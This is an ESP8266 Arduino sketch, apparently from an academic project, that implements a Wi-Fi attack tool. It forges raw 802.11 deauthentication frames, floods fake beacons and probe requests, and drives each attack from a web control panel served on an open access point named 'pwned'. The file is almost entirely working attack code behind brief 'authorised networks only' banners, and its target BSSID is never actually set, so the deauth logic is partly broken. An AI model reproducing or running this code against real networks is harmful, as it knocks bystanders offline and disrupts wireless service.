/*
 * ============================================================
 *  Portable DDoS Attack Simulation Tool
 *  Author      : R. Sreenidhi
 *  Co-Author   : Dr. Shweta Suryawanshi
 *  Institution : Dr. D.Y. Patil Institute of Engineering,
 *                Management & Research, Pune, India
 * ============================================================
 *
 *  NOTE: This project primarily uses the pre-built
 *  SpacehuhnTech ESP8266 Deauther firmware (.bin).
 *  This sketch is a reference/educational scaffold showing
 *  how the core attack logic works under the hood.
 *
 *  To run the actual tool, flash:
 *    firmware/esp8266_deauther_1mb.bin
 *  using the NodeMCU Flasher in flasher/nodemcu-flasher.zip
 *
 * ============================================================
 *  Hardware:
 *    - ESP8266 NodeMCU (ESP-12E)
 *    - ICR-18650 Li-ion 3.7V 1200mAh battery
 *    - TP4056 charging module
 *    - DC-DC boost converter
 *
 *  Attack Modes:
 *    1. Deauthentication Attack  → 92% disconnection in 10s
 *    2. Beacon Flooding Attack   → 500+ fake SSIDs/min
 *    3. Probe Request Attack     → ramps to 50 pkts/s in 5s
 *
 *  ⚠️  ETHICAL USE ONLY — authorised networks only
 * ============================================================
 */

extern "C" {
  #include "user_interface.h"
}

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>

// ─── Pin & Config ─────────────────────────────────────────────
#define LED_PIN          2
#define BEACON_COUNT    50
#define PROBE_RATE_MAX  50
#define ATTACK_INTERVAL 10

const char* AP_SSID = "pwned";   // Matches SpacehuhnTech default
const char* AP_PASS = "";

// ─── State ────────────────────────────────────────────────────
ESP8266WebServer server(80);

enum AttackMode { NONE, DEAUTH, BEACON, PROBE };
AttackMode activeAttack = NONE;

struct { uint8_t bssid[6]; uint8_t channel; String ssid; } target;

unsigned long packetCount = 0;
unsigned long attackStart = 0;
bool          isRunning   = false;

// ─── Helpers ──────────────────────────────────────────────────
void randomMAC(uint8_t* m) {
  for (int i = 0; i < 6; i++) m[i] = random(0xFF);
  m[0] = (m[0] & 0xFE) | 0x02;
}

// ─── Attack 1: Deauthentication ───────────────────────────────
void sendDeauth() {
  uint8_t pkt[26] = {
    0xC0,0x00, 0x00,0x00,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0,0,0,0,0,0,
    0,0,0,0,0,0,
    0x00,0x00,
    0x07,0x00
  };
  memcpy(&pkt[10], target.bssid, 6);
  memcpy(&pkt[16], target.bssid, 6);
  wifi_set_channel(target.channel);
  if (wifi_send_pkt_freedom(pkt, 26, 0) == 0) packetCount++;
  delay(ATTACK_INTERVAL);
}

// ─── Attack 2: Beacon Flooding ────────────────────────────────
void sendBeacon() {
  for (int i = 0; i < BEACON_COUNT; i++) {
    uint8_t mac[6]; randomMAC(mac);
    String  ssid = "DDOS" + String(i);
    uint8_t sl   = ssid.length();

    uint8_t body[64] = {0};
    int off = 0;
    memset(&body[off], 0, 8); off += 8;       // Timestamp
    body[off++]=0x64; body[off++]=0x00;        // Beacon interval
    body[off++]=0x01; body[off++]=0x04;        // Capabilities
    body[off++]=0x00; body[off++]=sl;          // SSID element
    memcpy(&body[off], ssid.c_str(), sl); off+=sl;
    body[off++]=0x03; body[off++]=0x01;        // DS Param
    body[off++]=target.channel;

    uint8_t frame[128] = {
      0x80,0x00, 0x00,0x00,
      0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
      0,0,0,0,0,0,
      0,0,0,0,0,0,
      0x00,0x00
    };
    memcpy(&frame[10], mac, 6);
    memcpy(&frame[16], mac, 6);
    memcpy(&frame[24], body, off);
    if (wifi_send_pkt_freedom(frame, 24+off, 0) == 0) packetCount++;
  }
  delay(ATTACK_INTERVAL);
}

// ─── Attack 3: Probe Request ──────────────────────────────────
void sendProbe() {
  uint8_t src[6]; randomMAC(src);
  uint8_t pkt[38] = {
    0x40,0x00, 0x00,0x00,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0,0,0,0,0,0,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0x00,0x00,
    0x00,0x00,
    0x01,0x08, 0x82,0x84,0x8B,0x96, 0x24,0x30,0x48,0x6C
  };
  memcpy(&pkt[10], src, 6);
  if (wifi_send_pkt_freedom(pkt, 38, 0) == 0) packetCount++;

  unsigned long elapsed = (millis() - attackStart) / 1000;
  int d = (elapsed < 5) ? max(1,(int)(100-elapsed*18)) : (1000/PROBE_RATE_MAX);
  delay(d);
}

// ─── Web UI ───────────────────────────────────────────────────
void handleRoot() {
  String html = "<!DOCTYPE html><html><head>"
    "<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>DDoS Sim</title>"
    "<style>"
    "body{background:#0a0a0a;color:#00ff41;font-family:monospace;padding:16px}"
    "h1{color:#00cfff;font-size:1.1em;margin-bottom:4px}"
    ".warn{color:#ff6b00;font-size:.75em;margin-bottom:14px}"
    ".card{border:1px solid #222;background:#111;padding:12px;border-radius:4px;margin-bottom:10px}"
    "label{font-size:.8em;color:#aaa;display:block;margin-bottom:3px}"
    "input,select{width:100%;background:#0a0a0a;color:#00ff41;border:1px solid #333;"
                 "padding:6px;font-family:monospace;font-size:.85em;border-radius:2px}"
    ".btns{display:flex;gap:6px;flex-wrap:wrap;margin-top:10px}"
    "button{flex:1;padding:8px;font-family:monospace;font-size:.78em;"
           "cursor:pointer;border-radius:2px;border:1px solid}"
    ".d{background:#1a0000;color:#ff4444;border-color:#ff4444}"
    ".b{background:#001a00;color:#44ff44;border-color:#44ff44}"
    ".p{background:#00001a;color:#4488ff;border-color:#4488ff}"
    ".s{background:#1a1a00;color:#ffff00;border-color:#ffff00}"
    "#stats{font-size:.78em;line-height:1.9;color:#888}"
    "#stats span{color:#00ff41}"
    "</style></head><body>"
    "<h1>⚡ Portable DDoS Sim Tool</h1>"
    "<p class='warn'>⚠️ Authorised networks only</p>"
    "<div class='card'>"
    "<label>Target SSID</label>"
    "<input id='s' placeholder='Network name'>"
    "<label style='margin-top:8px'>Channel</label>"
    "<select id='c'>";
  for (int i=1;i<=13;i++) html += "<option value='"+String(i)+"'>"+String(i)+"</option>";
  html += "</select>"
    "<div class='btns'>"
    "<button class='d' onclick=\"go('deauth')\">▶ Deauth</button>"
    "<button class='b' onclick=\"go('beacon')\">▶ Beacon</button>"
    "<button class='p' onclick=\"go('probe')\"> ▶ Probe</button>"
    "<button class='s' onclick=\"go('stop')\">  ■ Stop</button>"
    "</div></div>"
    "<div class='card' id='stats'>Idle</div>"
    "<script>"
    "function go(t){"
    "var u=t==='stop'?'/stop':'/start?type='+t+'&ssid='+encodeURIComponent(document.getElementById('s').value)+'&ch='+document.getElementById('c').value;"
    "fetch(u);}"
    "setInterval(()=>{"
    "fetch('/status').then(r=>r.json()).then(d=>{"
    "document.getElementById('stats').innerHTML="
    "'Mode: <span>'+d.mode+'</span><br>Running: <span>'+d.running+'</span><br>"
    "Packets: <span>'+d.packets+'</span><br>Elapsed: <span>'+d.elapsed+'s</span>';});"
    "},1000);</script></body></html>";
  server.send(200,"text/html",html);
}

void handleStart() {
  if (!server.hasArg("type")) { server.send(400,"text/plain","Missing type"); return; }
  String t = server.arg("type");
  target.ssid    = server.hasArg("ssid") ? server.arg("ssid") : "";
  target.channel = server.hasArg("ch")   ? server.arg("ch").toInt() : 1;
  if      (t=="deauth") activeAttack=DEAUTH;
  else if (t=="beacon") activeAttack=BEACON;
  else if (t=="probe")  activeAttack=PROBE;
  else { server.send(400,"text/plain","Unknown"); return; }
  isRunning=true; packetCount=0; attackStart=millis();
  Serial.println("[ATK] "+t+" → ch"+String(target.channel)+" "+target.ssid);
  server.send(200,"text/plain","OK");
}

void handleStop() {
  isRunning=false; activeAttack=NONE;
  Serial.println("[ATK] Stopped. Pkts: "+String(packetCount));
  server.send(200,"text/plain","Stopped");
}

void handleStatus() {
  String m="None";
  if(activeAttack==DEAUTH) m="Deauthentication";
  else if(activeAttack==BEACON) m="Beacon Flood";
  else if(activeAttack==PROBE)  m="Probe Request";
  float e = isRunning?(millis()-attackStart)/1000.0:0;
  server.send(200,"application/json",
    "{\"mode\":\""+m+"\","
    "\"running\":"+(isRunning?"true":"false")+","
    "\"packets\":"+String(packetCount)+","
    "\"elapsed\":"+String(e,1)+","
    "\"channel\":"+String(target.channel)+"}");
}

// ─── Setup & Loop ─────────────────────────────────────────────
void setup() {
  Serial.begin(115200);
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, HIGH);

  Serial.println("\n[INIT] Portable DDoS Sim — R. Sreenidhi");
  Serial.println("[WARN] EDUCATIONAL USE ONLY");

  WiFi.mode(WIFI_AP);
  WiFi.softAP(AP_SSID, AP_PASS);
  Serial.println("[NET] AP: pwned | IP: "+WiFi.softAPIP().toString());

  server.on("/",       handleRoot);
  server.on("/start",  handleStart);
  server.on("/stop",   handleStop);
  server.on("/status", handleStatus);
  server.begin();
  Serial.println("[RDY] http://192.168.4.1");
  digitalWrite(LED_PIN, LOW);
}

void loop() {
  server.handleClient();
  if (isRunning) {
    digitalWrite(LED_PIN, (millis()/200)%2);
    switch(activeAttack) {
      case DEAUTH: sendDeauth(); break;
      case BEACON: sendBeacon(); break;
      case PROBE:  sendProbe();  break;
      default: break;
    }
    if (millis()%5000 < ATTACK_INTERVAL) {
      float e=(millis()-attackStart)/1000.0;
      Serial.printf("[STAT] Pkts:%lu | %.1fs | %.1fpkt/s\n",
                    packetCount,e,e>0?packetCount/e:0);
    }
  } else {
    digitalWrite(LED_PIN, HIGH);
  }
}
